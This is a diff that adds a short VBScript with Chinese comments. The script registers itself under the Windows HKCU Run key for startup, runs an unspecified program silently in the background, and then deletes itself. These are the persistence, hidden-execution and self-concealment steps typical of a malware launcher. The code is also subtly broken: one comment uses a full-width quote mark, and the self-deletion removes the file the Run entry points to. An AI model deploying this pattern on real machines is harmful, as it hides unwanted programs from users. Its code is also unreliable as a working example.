@@ -1,0 +1,9 @@
+dim fso,f,ws
+Set fso=CreateObject("Scripting.FileSystemObject")
+Set f=Fso.GetFile(WScript.ScriptFullName)
+Set Ws=CreateObject("WScript.Shell")
+Ws.regwrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"&f.name,f.path ‘将自身设置为开机启动项
+Ws.Run "程序路径",0,True  '后台运行某个程序
+fso.deletefile wscript.scriptfullname '删除自身
+
+
